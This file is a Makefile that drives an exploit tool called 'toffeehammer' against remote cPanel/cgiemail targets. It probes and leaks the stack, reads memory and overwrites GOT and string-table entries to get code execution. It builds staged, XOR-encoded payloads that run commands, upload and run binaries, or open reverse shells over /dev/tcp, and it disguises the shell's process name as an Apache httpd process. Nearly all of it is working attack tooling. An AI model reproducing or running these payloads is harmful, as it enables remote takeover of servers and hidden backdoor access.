





SHELL = /bin/bash


MAKEFLAGS = --no-print-directory





TGTNAME ?= $(TGTURL)

TGTNAME := $(subst :,_,$(TGTNAME))
TGTNAME := $(subst /,_,$(TGTNAME))
TGTNAME := $(subst .,_,$(TGTNAME))





EXPLOIT_METHOD ?=










ifdef DISABLE_PROBE
  TH_OPTIONS_PROBE = 
else
  TH_OPTIONS_PROBE = --probe-get-with-body
endif






FAKE_ARGV ?= /usr/local/apache/bin/httpd





ifdef KILL_PARENT
  KILL_PARENT_OPTION = --kill-parent
endif







TH_DIR = ..

TH_OPTIONS_DICT = --target-exe-dict "$(TH_DIR)/dict"

TH_OPTIONS_OUTPUT = --output-prefix "$(TGTNAME).toffeehammer.$$(date +%s)"







ifdef DISABLE_PYTHON_BASE64
  NO_BASE64_OPTION = --no-base64
endif





XOR_SEED ?= 0x35c3d862
XOR_ROTATE ?= 9





ESCAPE_TYPE ?= all












ifdef TMPF_FD
  SCRIPT_STAGE1_PAYLOAD_FD = $(TMPF_FD)
else
  SCRIPT_STAGE1_PAYLOAD_FD = $$(/usr/bin/find /proc/self/fd -lname "/tmp/tmp*deleted*" 2>/dev/null | /usr/bin/cut -d/ -f5 2>/dev/null)
endif






SCRIPT_STAGE1_PRE_EXEC = cd /tmp; sleep 1; 



NASM = ./nasm
ELFEXTRACTOR = ./Elfextractor



GCCFLAGS = -Wall -ansi -pedantic -s








help:
	@( echo 'Usage: make runexisting|runshellscript|runshellcommands|connectbacksh|uploadnrun TGTURL=... [TGTNAME=...] ...'; true )

check_TGTURL:
	@[[ "$(TGTURL)" ]] || ( echo 'TGTURL must be set. Try "make help" for help.'; false )

runexisting runshellscript runshellcommands connectbacksh uploadnrun: check_TGTURL $(TGTNAME).target_options $(TGTNAME).exploit_method clean
	@[[ -s "$(TGTNAME).target_options" ]] || ( echo 'Error: target options not determined'; false )
	@[[ -s "$(TGTNAME).exploit_method" ]] || ( echo 'Error: exploit method not determined'; false )
	@echo
	$(MAKE) do_$@ EXP_METHOD="$(shell cat $(TGTNAME).exploit_method)" TH_OPTIONS_TARGET="$(shell cat $(TGTNAME).target_options)"







test: clean_test test_runexisting test_runshellscript test_runshellcommands test_uploadnrun
	@echo; echo '*** ALL TESTS PASSED SUCCESSFULLY ***'

test_runexisting: clean clean_$(TGTNAME)
	@echo 'std in' > "$@.stdin"
	$(MAKE) runexisting TH_OPTIONS_OUTPUT="--output-prefix $@" FILENAME=/bin/sh STDIN="$@.stdin" ARGV="/bin/sh -c 'cat; id; env'" ENVP="FOO=BAR"
	@-$(RM) -f "$@.stdin"
	$(MAKE) check_stdin_uid_env TEST=$@

test_runshellscript: clean clean_$(TGTNAME)
	@echo 'echo "std in"; id; FOO=BAR env' > "$@.script"
	$(MAKE) runshellscript TH_OPTIONS_OUTPUT="--output-prefix $@" SCRIPT="$@".script
	@-$(RM) -f "$@.script"
	$(MAKE) check_stdin_uid_env TEST=$@

test_runshellcommands: clean clean_$(TGTNAME)
	$(MAKE) runshellcommands TH_OPTIONS_OUTPUT="--output-prefix $@" COMMANDS="echo std in; id; FOO=BAR env"
	$(MAKE) check_stdin_uid_env TEST=$@

test_uploadnrun: clean clean_$(TGTNAME)
	@echo 'std in' > "$@.stdin"
	@( echo '#!/bin/sh' ; echo 'cat;id;env' ) > "$@.exe"
	$(MAKE) uploadnrun TH_OPTIONS_OUTPUT="--output-prefix $@" EXECUTABLE="$@.exe" STDIN="$@.stdin" ARGV= ENVP="FOO=BAR"
	@-$(RM) -f "$@.exe" "$@.stdin"
	$(MAKE) check_stdin_uid_env TEST=$@

check_stdin_uid_env:
	@echo
	@grep -q 'std in' $(TEST).poke_mem.response && \
	grep -q 'uid='    $(TEST).poke_mem.response && \
	grep -q 'FOO=BAR' $(TEST).poke_mem.response && \
	echo "*** PASS $(TEST)" || ( echo "*** FAIL $(TEST)" ; false )
	@echo

clean_test:
	@-$(RM) test_runexisting.* test_runshellscript.* test_runshellcommands.* test_uploadnrun.*














do_runexisting:
	@[[ "$(FILENAME)" ]] || ( echo 'Usage: make runexisting FILENAME=/path/on/target STDIN= ARGV= ENVP='; false )
	$(MAKE) do_$(EXP_METHOD)_runexisting








do_runshellcommands:
	@[[ "$(COMMANDS)" ]] || ( echo 'Usage: make runshellcommands COMMANDS="pwd;cat /proc/mounts;find /proc/self/fd -ls;..."'; false )
	$(MAKE) do_$(EXP_METHOD)_runshellcommands








do_runshellscript:
	@[[ "$(SCRIPT)" && -r "$(SCRIPT)" ]] || ( echo 'Usage: make runshellscript SCRIPT=path/to/script'; false )
	$(MAKE) do_$(EXP_METHOD)_runshellscript











do_connectbacksh:
	@[[ "$(US)" && "$(PORT)" ]] || ( echo 'Usage: make connectbacksh US=... PORT=...'; false )
	$(MAKE) do_$(EXP_METHOD)_connectbacksh











do_uploadnrun:
	@[[ "$(EXECUTABLE)" && -r "$(EXECUTABLE)" ]] || ( echo 'Usage: make uploadnrun EXECUTABLE=path/to/exe STDIN=... ARGV=... ENVP=...'; false )
	$(MAKE) do_$(EXP_METHOD)_uploadnrun












do_wxstack_runexisting: clean_stage1 clean_shellcode_fork_exec
	$(MAKE) shellcode_fork_exec.xlle FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_wxstack PAYLOAD=shellcode_fork_exec.xlle




do_wxstack_uploadnrun: clean_stage1 clean_python_fork_exec
	$(MAKE) python_fork_exec.xlle FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) run_toffeehammer_wxstack PAYLOAD=python_fork_exec.xlle



do_wxstack_runshellscript:
	$(MAKE) do_wxstack_runexisting FILENAME="/bin/sh" STDIN="$(SCRIPT)" ARGV="$(FAKE_ARGV)" ENVP=



do_wxstack_runshellcommands: clean_shellcommandssh
	$(MAKE) shellcommands.sh
	$(MAKE) do_wxstack_runshellscript SCRIPT=shellcommands.sh

do_wxstack_connectbacksh: clean_connectbacksh
	$(MAKE) connectback.sh CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) do_wxstack_runshellscript SCRIPT=connectback.sh








do_ctf_runexisting: clean_ctf_stage1_python clean_ctf_stage2_python clean_python_fork_exec ctf_stage1_python.bin
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) ctf_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_ctf STAGE1=ctf_stage1_python.bin PAYLOAD=ctf_stage2_python.enc



do_ctf_uploadnrun: clean_ctf_stage1_python clean_ctf_stage2_python clean_python_fork_exec ctf_stage1_python.bin
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) ctf_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_ctf STAGE1=ctf_stage1_python.bin PAYLOAD=ctf_stage2_python.enc



do_ctf_runshellscript: clean_ctf_stage1_shell clean_ctf_stage2_shell ctf_stage1_shell.enc
	$(MAKE) ctf_stage2_shell.enc
	$(MAKE) run_toffeehammer_ctf STAGE1=ctf_stage1_shell.bin PAYLOAD=ctf_stage2_shell.enc

do_ctf_runshellcommands: clean_ctf_stage1_shellcommands ctf_stage1_shellcommands.bin empty
	$(MAKE) run_toffeehammer_ctf STAGE1=ctf_stage1_shellcommands.bin PAYLOAD=empty

do_ctf_connectbacksh: clean_ctf_stage1_connectbacksh empty
	$(MAKE) ctf_stage1_connectbacksh.bin CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) run_toffeehammer_ctf STAGE1=ctf_stage1_connectbacksh.bin PAYLOAD=empty






do_strtab_runexisting: clean_strtab_stage1_python clean_strtab_stage2_python clean_python_fork_exec strtab_stage1_python.bin triplequote
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) strtab_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_strtab STAGE1=strtab_stage1_python.bin PAYLOAD=strtab_stage2_python.enc APPEND_TEMPLATE=triplequote

do_strtab_uploadnrun: clean_strtab_stage1_python clean_strtab_stage2_python clean_python_fork_exec strtab_stage1_python.bin triplequote
	$(MAKE) python_fork_exec.py FE_FILENAME="$(FILENAME)" FE_EXECUTABLE="$(EXECUTABLE)" FE_STDIN="$(STDIN)" FE_ARGV="$(ARGV)" FE_ENVP="$(ENVP)"
	$(MAKE) strtab_stage2_python.enc SCRIPT=python_fork_exec.py
	$(MAKE) run_toffeehammer_strtab STAGE1=strtab_stage1_python.bin PAYLOAD=strtab_stage2_python.enc APPEND_TEMPLATE=triplequote

do_strtab_runshellscript: clean_strtab_stage1_shell clean_strtab_stage2_shell strtab_stage1_shell.bin strtab_stage2_shell.enc triplequote
	$(MAKE) run_toffeehammer_strtab STAGE1=strtab_stage1_shell.bin PAYLOAD=strtab_stage2_shell.enc APPEND_TEMPLATE=triplequote

do_strtab_runshellcommands: clean_strtab_stage1_shellcommands strtab_stage1_shellcommands.bin empty
	$(MAKE) run_toffeehammer_strtab STAGE1=strtab_stage1_shellcommands.bin PAYLOAD=empty APPEND_TEMPLATE=empty

do_strtab_connectbacksh: clean_strtab_stage1_connectbacksh empty
	$(MAKE) strtab_stage1_connectbacksh.bin CB_ARGV="$(FAKE_ARGV)" CB_IPADDR="$(US)" CB_PORT="$(PORT)"
	$(MAKE) run_toffeehammer_strtab STAGE1=strtab_stage1_connectbacksh.bin PAYLOAD=empty APPEND_TEMPLATE=empty













$(TGTNAME).probe.log:
	@echo; echo "+++ Running toffeehammer --leak-stack to determine target options and appropriate exploit method..."
	@echo '$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \'
	@echo '	--output-prefix "$(TGTNAME).probe" \'
	@echo '	$(TH_OPTIONS_PROBE) --leak-stack \'
	@echo '	"$(TGTURL)"'
	@echo
	@$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) --output-prefix "$(TGTNAME).probe" $(TH_OPTIONS_PROBE) --leak-stack "$(TGTURL)" \
	|| ( echo 'Error: probe failed. If output ($(TGTNAME).probe.*) looks benign, delete "$@" and try again with DISABLE_PROBE=1'; false )


$(TGTNAME).target_options: $(TGTNAME).probe.log
	@grep -q " Using target options: --" "$<" \
	|| ( echo 'Error: probe failed. If output ($(TGTNAME).probe.*) looks benign, delete "$<" and try again with DISABLE_PROBE=1'; false )
	@sed -ne '/ Using target options: /s/.*: //p' "$<" > "$@".probed
	
	@if grep -q -E -- "--target-exe 'cPanel[(].*([|].*)+[)]'" "$@".probed; \
	then \
	  echo; echo "+++ Probe result ambiguous! Using toffeehammer --read-memory to identify executable..."; \
	  if grep -q -F -- '--target-word-size 4 --target-stack-offset 78' "$@".probed; \
	  then \
	    echo '$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \'; \
	    echo '	--output-prefix "$(TGTNAME).target_check" \'; \
	    echo '	--target-word-size 4 --target-stack-offset 78 \'; \
	    echo '	--read-memory 0x08048e32-0x08048e36 \'; \
	    echo '	"$(TGTURL)"'; \
	    echo; \
	    $(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) --output-prefix "$(TGTNAME).target_check" \
	      --target-word-size 4 --target-stack-offset 78 --read-memory '0x08048e32-0x08048e36' "$(TGTURL)"; \
	    if   printf '%b' '\xb8\xc1\x04\x08' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(18492)' --target-word-size 4 --target-stack-offset 78" > "$@"; \
	    elif printf '%b' '\xac\xce\x04\x08' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(17696)' --target-word-size 4 --target-stack-offset 78" > "$@"; \
	    elif printf '%b' '\x8c\xce\x04\x08' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(17664)' --target-word-size 4 --target-stack-offset 78" > "$@"; \
	    else \
	      ( echo 'Error: failed to identify executable, check $(TGTNAME).target_check.read_mem.ditted'; false ); \
	    fi; \
	  elif grep -q -F -- '--target-word-size 8 --target-stack-offset 128' "$@".probed; \
	  then \
	    echo '$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \'; \
	    echo '	--output-prefix "$(TGTNAME).target_check" \'; \
	    echo '	--target-word-size 8 --target-stack-offset 128 \'; \
	    echo '	--read-memory 0x00000000004013d2-0x00000000004013d6 \'; \
	    echo '	"$(TGTURL)"'; \
	    echo; \
	    $(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) --output-prefix "$(TGTNAME).target_check" \
	      --target-word-size 8 --target-stack-offset 128 --read-memory '0x00000000004013d2-0x00000000004013d6' "$(TGTURL)"; \
	    if   printf '%b' '\x3a\x37\x20\x00' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(21536)' --target-word-size 8 --target-stack-offset 128" > "$@"; \
	    elif printf '%b' '\x52\x38\x20\x00' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(21832)' --target-word-size 8 --target-stack-offset 128" > "$@"; \
		elif printf '%b' '\x42\x38\x10\x00' | cmp -s - "$(TGTNAME).target_check.read_mem.ditted"; \
	    then echo "--target-exe 'cPanel(21800)' --target-word-size 8 --target-stack-offset 128" > "$@"; \
	    else \
	      ( echo 'Error: failed to identify executable, check $(TGTNAME).target_check.read_mem.ditted'; false ); \
	    fi \
	  else \
	    ( echo "Error: unsupported --target-word-size and --target-stack-offset in $@.probed result"; false ); \
	  fi; \
	else \
	    cat "$@".probed > "$@"; \
	fi




$(TGTNAME).exploit_method: $(TGTNAME).target_options
	@( [[ -n "$(EXPLOIT_METHOD)" ]] && echo "$(EXPLOIT_METHOD)"    > "$@" ) || \
	 ( grep -q -E "cPanel\((18324|18280|21800)\)" "$<" && echo "strtab"  > "$@" ) || \
	 ( grep -q "target-word-size 4"         "$<" && echo "wxstack" > "$@" ) || \
	 ( grep -q "target-word-size 8"         "$<" && echo "ctf"     > "$@" ) || \
	 ( echo 'Error: could not determine exploit method from "$<"'; false )





run_toffeehammer_wxstack: stage1_$(XOR_SEED)_$(XOR_ROTATE)_intemplate.bin
	@[[ "$(PAYLOAD)" && -r "$(PAYLOAD)" ]] || ( echo 'Error: PAYLOAD not set or not found.'; false )
	@sleep 1; echo; echo "+++ Running toffeehammer (wxstack shellcode method)..."
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \
	$(TH_OPTIONS_OUTPUT) \
	$(TH_OPTIONS_TARGET) \
	--poke-memory 'addr_popebx_popebp_ret@got.strcmp' \
	--prepend-template "$(PAYLOAD)" --append-template "$<" \
	"$(TGTURL)" \
	
	@echo







run_toffeehammer_ctf:
	@[[ "$(PAYLOAD)" && -r "$(PAYLOAD)" ]] || ( echo 'Error: PAYLOAD not set or not found.'; false )
	@[[ "$(STAGE1)" && -r "$(STAGE1)" ]] || ( echo 'Error: STAGE1 not set or not found.'; false )
	@sleep 1; echo; echo "+++ Running toffeehammer (ctf shell command method)..."
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \
	$(TH_OPTIONS_OUTPUT) \
	$(TH_OPTIONS_TARGET) \
	--poke-memory 'plt.popen@got.fopen' \
	--poke-memory 'cgi_template_fill+12@got.__xstat' \
	--poke-memory 'wrap_xstat@got.getenv' \
	--prepend-template "$(PAYLOAD)" --append-template "$(STAGE1)" \
	"$(TGTURL)" \
	
	@echo







run_toffeehammer_strtab: 
	@[[ "$(PAYLOAD)" && -r "$(PAYLOAD)" ]] || ( echo 'Error: PAYLOAD not set or not found.'; false )
	@[[ "$(STAGE1)" && -r "$(STAGE1)" ]] || ( echo 'Error: STAGE1 not set or not found.'; false )
	
	@./prepare_cgiemail_payload --escape-type all < "$(STAGE1)" > "$(STAGE1).enc"
	@( cat "$(STAGE1).enc"; printf '%8191s' "$$(cat $(STAGE1))" | sed 's/[^ ].*//'; printf '\n'; cat "$(PAYLOAD)" ) > strtab.bin
	@rm "$(STAGE1).enc"
	
	@sleep 1; echo; echo "+++ Running toffeehammer (strtab shell command method)..."
	$(TH_DIR)/toffeehammer $(TH_OPTIONS) $(TH_OPTIONS_DICT) \
	$(TH_OPTIONS_OUTPUT) \
	$(TH_OPTIONS_TARGET) \
	--poke-memory 'fakestrtab.base@dynamic.strtab' \
	--poke-memory 'strings!fclose@fakestrtab.fclose' \
	--poke-memory 'strings!rewind@fakestrtab.rewind' \
	--poke-memory 'strings!puts@fakestrtab.puts' \
	--poke-memory 'strings!fread@fakestrtab.fread' \
	--poke-memory 'strings!system@fakestrtab.fwrite' \
	--poke-memory 'strings!exit@fakestrtab.free' \
	--prepend-template "strtab.bin" --append-template "$(APPEND_TEMPLATE)" \
	"$(TGTURL)" \
	
	@echo
	
	@rm "strtab.bin"

















clean_stage1:

clean_stage1_release:














clean_stage1_intemplate:

clean_stage1_intemplate_release:












clean_shellcode:

clean_shellcode_release:


















ctf_stage1_shell.bin:
	@echo -n '[$$$(SCRIPT_STAGE1_PRE_EXEC)exec $$0<&$(SCRIPT_STAGE1_PAYLOAD_FD) 2>&1]' > "$@"

clean_ctf_stage1_shell:
	@-$(RM) ctf_stage1_shell.bin





ctf_stage1_python.bin:
	@echo -n '"""[$$$(SCRIPT_STAGE1_PRE_EXEC)exec /usr/bin/python<&$(SCRIPT_STAGE1_PAYLOAD_FD) 2>&1]' > "$@"

clean_ctf_stage1_python:
	@-$(RM) ctf_stage1_python.bin


ctf_stage1_connectbacksh.bin:
	@echo -n '[$$printf "\x5bfailure\x5d";cd /tmp;exec -a ${CB_ARGV} /bin/sh </dev/tcp/${CB_IPADDR}/${CB_PORT} >&0 2>&0 &]' > "$@"

clean_ctf_stage1_connectbacksh:
	@-$(RM) ctf_stage1_connectbacksh.bin


ctf_stage1_shellcommands.bin:
	@echo -n '[$$printf "\x5bfailure\x5d";cd /tmp;(${COMMANDS}) 2>&1]' > "$@"

clean_ctf_stage1_shellcommands:
	@-$(RM) ctf_stage1_shellcommands.bin







strtab_stage1_shell.bin:
	@echo -n 'echo;(exec 2>&1;cd /tmp;f="$(SCRIPT_STAGE1_PAYLOAD_FD)";echo $$f;exec /bin/sh <&$$f;)echo exec;exit;#' > "$@"

clean_strtab_stage1_shell:
	@-$(RM) strtab_stage1_shell.bin


strtab_stage1_python.bin:
	@echo -n 'echo;(exec 2>&1;cd /tmp;f="$(SCRIPT_STAGE1_PAYLOAD_FD)";echo $$f;exec /usr/bin/python <&$$f);echo exec;exit;#' > "$@"

clean_strtab_stage1_python:
	@-$(RM) strtab_stage1_python.bin


strtab_stage1_connectbacksh.bin:
	@echo -n 'echo;exec 2>&1;cd /tmp;(exec -a ${CB_ARGV} /bin/sh </dev/tcp/${CB_IPADDR}/${CB_PORT} >&0 2>&0 &);echo exec;exit;#' > "$@"

clean_strtab_stage1_connectbacksh:
	@-$(RM) strtab_stage1_connectbacksh.bin


strtab_stage1_shellcommands.bin:
	@echo -n 'echo;exec 2>&1;cd /tmp;(${COMMANDS});exit;#' > "$@"

clean_strtab_stage1_shellcommands:
	@-$(RM) strtab_stage1_shellcommands.bin










ctf_stage2_shell.bin:
	@echo 'echo "[failure]"'       > "$@"

	@cat "$(SCRIPT)"              >> "$@"

	@echo                         >> "$@"
	@echo 'exit'                  >> "$@"

clean_ctf_stage2_shell:
	@-$(RM) ctf_stage2_shell{.bin,.enc}














ctf_stage2_python.bin:
	@echo 'print "[failure]"'      > "$@"

	@echo 'import os'             >> "$@"
	@echo 'try:'                  >> "$@"
	@echo '  os.lseek(0,0,0)'     >> "$@"
	@echo '  os.ftruncate(0,0)'   >> "$@"
	@echo 'except:'               >> "$@"
	@echo '  pass'                >> "$@"

	@cat "$(SCRIPT)"              >> "$@"

	@echo                         >> "$@"
	@echo '"""'                   >> "$@"

clean_ctf_stage2_python:
	@-$(RM) ctf_stage2_python{.bin,.enc}






strtab_stage2_shell.bin:
	@cat "$(SCRIPT)"              >> "$@"
	@echo                         >> "$@"
	@echo 'exit'                  >> "$@"

clean_strtab_stage2_shell:
	@-$(RM) strtab_stage2_shell{.bin,.enc}


strtab_stage2_python.bin:
	@cat "$(SCRIPT)"              >> "$@"
	@echo                         >> "$@"
	@echo '"""'                   >> "$@"

clean_strtab_stage2_python:
	@-$(RM) strtab_stage2_python{.bin,.enc}


















clean_fork_exec:


clean_fork_exec_release:


shellcode_fork_exec.bin:
	@./prepare_shellcode_fork_exec $(KILL_PARENT_OPTION) --filename "$(FE_FILENAME)" --stdin "$(FE_STDIN)" --argv $(FE_ARGV) --envp $(FE_ENVP) > "$@"

clean_shellcode_fork_exec:
	@-$(RM) shellcode_fork_exec{.bin,.xlle}






python_fork_exec.py:
	@./prepare_python_fork_exec $(VIA_SUEXEC_OPTION) $(NO_BASE64_OPTION) --filename "$(FE_FILENAME)" --executable "$(FE_EXECUTABLE)" --stdin "$(FE_STDIN)" --argv $(FE_ARGV) --envp $(FE_ENVP) > "$@"

python_fork_exec.bin: python_fork_exec.py
	@./prepare_shellcode_fork_exec $(KILL_PARENT_OPTION) --filename "/usr/bin/python" --stdin python_fork_exec.py --argv "$(FAKE_ARGV)" > "$@"

clean_python_fork_exec:
	@-$(RM) python_fork_exec{.py,.sh,.bin,.xlle}





shellcommands.sh:
	@echo 'printf "\x5bfailure\x5d";cd /tmp;(${COMMANDS}) 2>&1' > "$@"
clean_shellcommandssh:
	@-$(RM) shellcommands.sh





connectback.sh:
	echo "exec -a ${CB_ARGV} /bin/sh </dev/tcp/${CB_IPADDR}/${CB_PORT} >&0 2>&0 &" > "$@"
clean_connectbacksh:
	@-$(RM) connectback.sh









%.enc: %.bin
	@./prepare_cgiemail_payload --escape-type "$(ESCAPE_TYPE)" < "$<" > "$@"




%.xlle: %.bin
	@./prepare_cgiemail_payload --xor-seed "$(XOR_SEED)" --xor-rotate "$(XOR_ROTATE)" < "$<" | \
	./prepare_cgiemail_payload --prepend-length | \
	./prepare_cgiemail_payload --prepend-length | \
	./prepare_cgiemail_payload --escape-type "$(ESCAPE_TYPE)" > "$@"
























clean_prepare_programs_release:





trigger_strcmp:
	@echo -n '[x]' > "$@"
clean_trigger_strcmp:
	@-$(RM) trigger_strcmp


empty:
	@touch empty
clean_empty:
	@-$(RM) empty


triplequote:
	@echo '"""' > "$@"
clean_triplequote:
	@-$(RM) triplequote








clean: \
	clean_stage1 \
	clean_stage1_intemplate \
	clean_shellcode \
	clean_ctf_stage1_shell \
	clean_ctf_stage1_python \
	clean_ctf_stage1_connectbacksh \
	clean_ctf_stage1_shellcommands \
	clean_strtab_stage1_shell \
	clean_strtab_stage1_python \
	clean_strtab_stage1_connectbacksh \
	clean_strtab_stage1_shellcommands \
	clean_ctf_stage2_shell \
	clean_ctf_stage2_python \
	clean_strtab_stage2_shell \
	clean_strtab_stage2_python \
	clean_fork_exec \
	clean_shellcode_fork_exec \
	clean_python_fork_exec \
	clean_connectbacksh \
	clean_shellcommandssh \
	clean_trigger_strcmp \
	clean_empty \
	clean_triplequote


clean_release: \
	clean_stage1_release \
	clean_stage1_intemplate_release \
	clean_shellcode_release \
	clean_fork_exec_release \
	clean_prepare_programs_release


clean_$(TGTNAME):
	@-$(RM) -f $(TGTNAME).*


clean_all: clean clean_test clean_$(TGTNAME)

